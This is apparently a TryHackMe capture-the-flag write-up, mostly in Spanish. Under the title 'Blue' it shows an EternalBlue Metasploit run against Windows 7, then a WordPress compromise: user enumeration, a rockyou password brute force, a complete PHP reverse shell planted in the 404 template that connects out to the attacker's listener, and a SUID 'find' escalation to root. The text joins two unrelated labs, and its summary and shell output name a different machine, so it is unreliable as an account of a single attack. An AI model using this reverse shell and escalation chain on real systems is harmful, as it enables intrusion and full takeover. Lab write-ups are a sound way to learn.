# Blue — Writeup

**Fecha:** 5-10-2025\
**Plataforma:** TryHackMe

---

## TL;DR

Se encontró un WordPress vulnerable, se obtuvieron credenciales por fuerza bruta, se subió un reverse shell editando la plantilla 404, se consiguió shell como www-data, se mejoró a TTY interactiva y se explotó /usr/bin/find con SUID para elevar a root y leer las flags.

---

## Enumeration (nmap)

```bash
nmap -sV -sC --open $IP -oN scan.txt
```

**Comment:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.

**Result**
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

**Relevant Result**
* 445/tcp open microsoft-ds (Windows 7)
  
---

## Foothold (Metasploit)

```bash
  msfconsole
  msf > search windows 7 eternalblue
```
**Comment:** 'msfconsole' abre la interfaz de Metasploit

**Result**
```bash
#   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010
```

**Set Exploit**
```bash
  msf > Use 0
  msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS $MACHINEIP
  msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST $LOCALIP
```

**Run Exploit**
```bash
  msf exploit(windows/smb/ms17_010_eternalblue) > run
  meterpreter > 
```
## User Enumeration

```bash
  wpscan --url http://$IP --enumerate u 
```
**Comment:** `--enumerate u` enumera usuarios de wordpress.

**Result**
```bash
[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

---

**Brute Force**
```bash
  wpscan --url http://$IP --usernames wp-users.txt --passwords /usr/share/wordlists/rockyou.txt
```
<details><summary><i>wp-users.txt</i></summary>

```bash
the cold in person 
c0ldd 
hugo 
philip
```
</details>

**Result**
```bash
[!] Valid Combinations Found:
 | Username: c0ldd, Password: REDACTED
```
## Foothold
**Login Wordpress**
```bash
http://$IP/wp-admin.php
Username: c0ldd, Password: REDACTED
```

**Edit Theme: 404 template**
```bash
404.php: reverse shell script
```

<details>
<summary>reverse shell script</summary>

```bash
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '$IP';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
 ?>
```

</details>

**Execute Payload**
```bash
http://$IP/wp-content/themes/twentyfifteen/404.php
```

**Listen Port**
```bash
$ nc -lvnp 1234             
listening on [any] 1234 ...
connect to [$IP] from (UNKNOWN) [$IP] 43560
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:40:36 up 17 min,  0 users,  load average: 0.07, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

**Upgrade Shell**
```bash
# introducir en reverse shell
$ script /dev/null -c bash

# introducir en local terminal
$ stty raw -echo;fg             
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@ColddBox-Easy:/$ 
```

---

## Privilege Escalation
**Find SUID Files**
```bash
find / -perm /4000 2>/dev/null
```
**Comment:** ``/usr/bin/find`` es el resultado relevante arrojado.

**Exploit SUID Find**
```bash
find . -exec /bin/sh -p \; -quit
# whoami
root
```

**Cat User Flag**
```bash
# cat /home/c0ldd/user.txt
```

**Cat Root Flag**
```bash
# cat /root/root.txt
```
